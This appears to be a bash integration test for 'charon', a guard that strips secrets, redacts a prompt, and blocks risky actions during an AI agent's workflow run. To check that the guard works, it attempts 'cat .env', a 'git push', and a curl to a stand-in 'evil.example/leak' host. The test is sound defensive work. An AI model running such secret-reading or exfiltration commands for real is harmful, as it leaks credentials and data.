#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
AEON="$TMP/aeon"

git clone --depth 1 https://github.com/aaronjmars/aeon "$AEON" >/dev/null 2>&1
cd "$AEON"

node "$ROOT/bin/charon.js" install --force >/tmp/charon-install.out
ruby -e 'require "yaml"; YAML.load_file(".github/workflows/aeon.yml")'

if command -v actionlint >/dev/null 2>&1; then
  set +e
  actionlint .github/workflows/aeon.yml >/tmp/charon-actionlint.out 2>/tmp/charon-actionlint.err
  ACTIONLINT_CODE=$?
  set -e
else
  ACTIONLINT_CODE="missing"
  : >/tmp/charon-actionlint.out
  : >/tmp/charon-actionlint.err
fi

mkdir -p .charon
printf '%s' 'prompt contains ghp_abcdefghijklmnopqrstuvwxyz1234567890' > .charon/prompt.txt
SKILL_NAME=contract-audit \
GITHUB_TOKEN=gh_secret \
GH_TOKEN=gh_secret \
ANTHROPIC_API_KEY=sk_secret \
CLAUDE_CODE_OAUTH_TOKEN=oat_secret \
node scripts/charon-runner.js >/tmp/charon-runner.out

. .charon/env.sh

set +e
cat .env >/tmp/charon-file.out 2>/tmp/charon-file.err
FILE_CODE=$?
git push origin main >/tmp/charon-git.out 2>/tmp/charon-git.err
GIT_CODE=$?
curl -s https://evil.example/leak >/tmp/charon-net.out 2>/tmp/charon-net.err
NET_CODE=$?
curl -s https://api.github.com >/tmp/charon-good.out 2>/tmp/charon-good.err
ALLOW_CODE=$?
set -e

RECEIPT="$(node "$ROOT/bin/charon.js" receipts latest)"
SUMMARY="$(printf '%s' "$RECEIPT" | node -e '
let s = "";
process.stdin.on("data", d => s += d).on("end", () => {
  const r = JSON.parse(s);
  console.log(JSON.stringify({
    verdict: r.verdict,
    redactions: r.redaction && r.redaction.replacements,
    blocked: (r.events || []).filter(e => e.decision === "block").length,
    allowed: (r.events || []).filter(e => e.decision === "allow").length
  }));
});
')"

echo "repo=$AEON"
echo "yaml=ok"
echo "actionlint=$ACTIONLINT_CODE"
echo "secrets GITHUB_TOKEN=${GITHUB_TOKEN-unset} GH_TOKEN=${GH_TOKEN-unset} ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY-unset} CLAUDE_CODE_OAUTH_TOKEN=${CLAUDE_CODE_OAUTH_TOKEN-unset}"
echo "codes file=$FILE_CODE git=$GIT_CODE network=$NET_CODE allow=$ALLOW_CODE"
echo "redacted_prompt=$(cat "$CHARON_REDACTED_PROMPT_FILE")"
echo "receipt=$SUMMARY"

test "${GITHUB_TOKEN-unset}" = "unset"
test "${GH_TOKEN-unset}" = "unset"
test "${ANTHROPIC_API_KEY-unset}" = "unset"
test "${CLAUDE_CODE_OAUTH_TOKEN-unset}" = "unset"
test "$FILE_CODE" = "126"
test "$GIT_CODE" = "126"
test "$NET_CODE" = "126"
test "$ALLOW_CODE" = "0"
printf '%s' "$SUMMARY" | grep -q '"verdict":"BLOCK"'
printf '%s' "$SUMMARY" | grep -q '"redactions":1'

echo "integration=pass"
